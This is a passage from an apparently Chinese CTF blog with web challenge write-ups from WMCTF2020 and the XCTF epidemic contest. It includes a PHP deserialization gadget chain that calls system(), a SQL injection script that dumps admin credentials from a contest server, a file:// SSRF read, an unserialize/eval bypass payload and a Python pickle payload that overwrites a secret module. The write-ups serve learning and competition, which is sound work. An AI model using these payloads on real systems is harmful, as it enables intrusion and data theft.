<p>它通过控制<code>$this-&gt;props</code>我们可以调用任意函数，那么我们只需要找到一个可控参数的位置就可以了</p>
<p>找到</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804120508.png" alt="image17250"></p>
<p>构造payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span>  <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span> <span class="title">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span>&#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">props</span>=[&quot;<span class="title">quotekey</span>&quot;=&gt;&quot;<span class="title">system</span>&quot;],</span><br><span class="line">            $<span class="title">adhoc</span>=[&quot;<span class="title">ls</span> -<span class="title">al</span>&quot;=&gt;[&quot;<span class="title">expr</span>&quot;=&gt;&quot;&quot;]],</span><br><span class="line">            $<span class="title">db</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$value</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="variable">$val</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">server</span>=&quot;&quot;;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=[<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="string">&quot;&quot;</span>)),<span class="string">&quot;find&quot;</span>)];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server=&amp;<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">array</span>(<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">WS</span>(),<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">Agent</span>())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Make-PHP-Great-Again-amp-amp-Make-PHP-Great-Again-2-0"><a href="#Make-PHP-Great-Again-amp-amp-Make-PHP-Great-Again-2-0" class="headerlink" title="Make PHP Great Again  &amp;&amp;  Make PHP Great Again 2.0"></a>Make PHP Great Again  &amp;&amp;  Make PHP Great Again 2.0</h2><p>这题是学长闲的无聊解出来的，说10分钟就ok的题目。。。膜拜</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804123108.png" alt="image18383"></p>
<p>实际调试的时候是这样的：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/RF5J9(A_2K%24)Z4VG%251B0WZI.png" alt="image18481"></p>
<p>上面还有一堆tsrm_realpath_r。</p>
<p>还有啥好说的？看代码。。。。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/wmctf2020/" data-id="cku89gxvm006uwvosd8hc0y6i" data-title="wmctf2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-xctf高校抗疫" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/xctf%E9%AB%98%E6%A0%A1%E6%8A%97%E7%96%AB/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.635Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/xctf%E9%AB%98%E6%A0%A1%E6%8A%97%E7%96%AB/">xctf高校抗疫</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="高校战疫"><a href="#高校战疫" class="headerlink" title="高校战疫"></a>高校战疫</h1><p>打完这次比赛,我再次认清了自己是个卑微的递茶小弟…</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a><strong>easy_trick_gzmtu</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2020\\%27 200</span><br><span class="line">2020%27 500</span><br><span class="line">2020\%27 500</span><br></pre></td></tr></table></figure>

<p>可能作为格式化字符串或者过滤<code>\</code> ?,继续测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://121.37.181.246:6333/?time=2020&#x27; or 1%23  =&gt;500</span><br><span class="line">http://121.37.181.246:6333/?time=2020or&#x27;%23 =&gt;无结果,说明不是过滤or</span><br><span class="line">http://121.37.181.246:6333/?time=2020&#x27;%23or=&gt;没有500,说明or不在黑名单中 </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?time=2020%27%20||1=1%20--+    返回正确结果</span><br><span class="line">/?time=2020%27%20or1=1%20--+   and   &amp;&amp;都页面报错</span><br><span class="line">/?time=-1%27%20||1=0%20--+   页面的hello world消失，应该存在布尔盲注</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?time=0&#x27;||\i\f(\s\l\e\e\p(2),1,1)%23</span><br><span class="line">成功执行,说明是过滤\</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line">sql=<span class="string">&quot;union select 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata&quot;</span></span><br><span class="line"><span class="comment">#sql=&quot;union select 1,GROUP_CONCAT(id,&#x27;,&#x27;,username,&#x27;,&#x27;,passwd,&#x27;,&#x27;,url,&#x27;,&#x27;),3 FROM admin&quot;</span></span><br><span class="line"><span class="comment">#admin,content</span></span><br><span class="line"><span class="comment">#admin</span></span><br><span class="line"><span class="comment">#id,username,passwd,url</span></span><br><span class="line"><span class="comment">#0,admin,20200202goodluck,/eGlhb2xldW5n,</span></span><br><span class="line">tmp=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sql:</span><br><span class="line">    <span class="keyword">if</span> i.isalpha():</span><br><span class="line">        tmp+=<span class="string">&quot;\\&quot;</span>+i</span><br><span class="line">        <span class="comment">#print(&quot;\\&quot;+i,end=&quot;&quot;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp+=i</span><br><span class="line">        <span class="comment">#print(i,end=&quot;&quot;)</span></span><br><span class="line"></span><br><span class="line">tmp=<span class="string">&quot;http://121.37.181.246:6333/?time=0&#x27;+&#123;&#125;%23&quot;</span>.<span class="built_in">format</span>(tmp)</span><br><span class="line">res=requests.get(tmp)</span><br><span class="line">result=re.search(<span class="string">r&#x27;&lt;div class=&quot;text-c &quot;&gt;(.*)&lt;/div&gt;&#x27;</span>,res.text)</span><br><span class="line"><span class="built_in">print</span>(result.group(<span class="number">1</span>))</span><br></pre></td></tr></table></figure>


<p>拿到后台地址和管理员账号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://121.37.181.246:6333/eGlhb2xldW5n</span><br><span class="line">admin,20200202goodluck</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://121.37.181.246:6333/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php</span><br><span class="line">http://121.37.181.246:6333/eGlhb2xldW5n/check.php</span><br><span class="line">http://121.37.181.246:6333/eGlhb2xldW5n/index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>php版本5.5.9,%00截断</p>
<p>check.php中可以读取文件但是需要本地访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Client-Ip: 127.0.0.1</span><br><span class="line">Referer: http://127.0.0.1/eGlhb2xldW5n/check.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">没有用</span><br><span class="line">eGlhb2xldW5nLnBocA==:xiaoleung.php</span><br><span class="line">eGlhb2xldW5n:xiaoleung</span><br><span class="line">注释里给的:eGlhb2xldW5nLnBocA==.php</span><br><span class="line">可能是突破的关键,但是里面啥都没有</span><br><span class="line">对eGlhb2xldW5nLnBocA==.php进行参数爆破,也没结果</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>存在http请求走私</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /eGlhb2xldW5n/check.php?url=fuck&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1</span><br><span class="line">Host: 121.37.181.246:6333</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Client-Ip: 127.0.0.1</span><br><span class="line">Cookie: PHPSESSID=9gkhjmmmp6ctmnn2578n3hcth1</span><br><span class="line"></span><br><span class="line">GET /eGlhb2xldW5n/check.php?url=fuck&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Client-Ip: 127.0.0.1</span><br><span class="line">Cookie: PHPSESSID=9gkhjmmmp6ctmnn2578n3hcth1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后学长跟我说这里本地访问的意思是url中的ip地址要为127.0.0.1……..无语</p>
<p>GET /eGlhb2xldW5n/check.php?url=file://localhost/var/www/html/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$gf</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">content_to_file</span>(<span class="params"><span class="variable">$content</span></span>)</span>&#123;	</span><br><span class="line">		<span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z]+\.passwd$/m&#x27;</span>,<span class="variable">$passwd</span>)) </span><br><span class="line">	&#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strpos(<span class="variable">$passwd</span>,<span class="string">&quot;20200202&quot;</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		 &#125; </span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aiisc_to_chr</span>(<span class="params"><span class="variable">$number</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$number</span>)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="variable">$str</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		 <span class="variable">$number</span> = str_split(<span class="variable">$number</span>,<span class="number">2</span>);</span><br><span class="line">		 <span class="keyword">foreach</span> (<span class="variable">$number</span> <span class="keyword">as</span> <span class="variable">$num</span> ) &#123;</span><br><span class="line">		 	<span class="variable">$str</span> = <span class="variable">$str</span> .chr(<span class="variable">$num</span>);</span><br><span class="line">		 &#125;</span><br><span class="line">		 <span class="keyword">return</span> strtolower(<span class="variable">$str</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> chr(<span class="variable">$number</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">calc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$gf</span>=<span class="keyword">$this</span>-&gt;gf;</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-zA-z0-9]|\&amp;|\^|#|\$|%/&#x27;</span>, <span class="variable">$gf</span>))&#123;</span><br><span class="line">		  	<span class="keyword">eval</span>(<span class="string">&#x27;$content=&#x27;</span>.<span class="variable">$gf</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">		  	<span class="variable">$content</span> =  <span class="keyword">$this</span>-&gt;aiisc_to_chr(<span class="variable">$content</span>); </span><br><span class="line">		  	<span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_to_file(<span class="keyword">$this</span>-&gt;calc());</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">unserialize((base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们要逻辑运算符非来绕过<code>preg_match(&#39;/[a-zA-z0-9]|\&amp;|\^|#|\$|%/&#39;, $gf)</code></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php?pass=aaa.passwd%0a20200202&amp;code=Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czoxMToifiLIz8jJycrIziIiO30%3DD</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>

<h3 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, render_template, request</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, category</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Animal(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.category!r&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">filename, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;source&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> Response(read(__file__), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;No... I don\&#x27;t like R-things. No Rabits, Rats, Roosters or RCEs.&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = restricted_loads(base64.b64decode(pickle_data))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(result) <span class="keyword">is</span> <span class="keyword">not</span> Animal:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;Are you sure that is an animal???&#x27;</span></span><br><span class="line">            correct = (result == Animal(secret.name, secret.category))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;unpickle_result.html&#x27;</span>, result=result, pickle_data=pickle_data, giveflag=correct)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">repr</span>(e))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Something wrong&quot;</span></span><br><span class="line"></span><br><span class="line">    sample_obj = Animal(<span class="string">&#x27;一给我哩giaogiao&#x27;</span>, <span class="string">&#x27;Giao&#x27;</span>)</span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;unpickle_page.html&#x27;</span>, sample_obj=sample_obj, pickle_data=pickle_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>我们可以控制反序列化的内容</p>
<p>但是反序列化还有限制:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure>

<p>只能再<code>__main__</code>中寻找属性,这样我们也就无法直接读取secret里的内容了</p>
<p>关键:</p>
<p><code>return render_template(&#39;unpickle_result.html&#39;, result=result, pickle_data=pickle_data, giveflag=correct)</code></p>
<p>不知道是<code>correct!=False</code>给flag还是<code>correct==True</code>给flag</p>
<p>决定correct的是:<code> correct = (result == Animal(secret.name, secret.category))</code></p>
<p>会调用<code>Animal的__eq__</code>我们可以令<code>__eq__</code>等于其他的函数来绕过,但是没有找到合适的两个参数的函数</p>
<p>后来发现<code>Animal(secret.name, secret.category)</code>是在反序列化之后执行的,如果我们可以修改secret,那么我们就可以控制结果</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">p=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&#x27;test&#x27;</span></span><br><span class="line"><span class="string">S&#x27;category&#x27;</span></span><br><span class="line"><span class="string">S&#x27;test&#x27;</span></span><br><span class="line"><span class="string">db&#x27;&#x27;&#x27;</span>+pickle.loads(Animal(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;test&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(p))</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;409ed945-5b77-4ec3-97e1-b395778842ba&#125;</code></p>
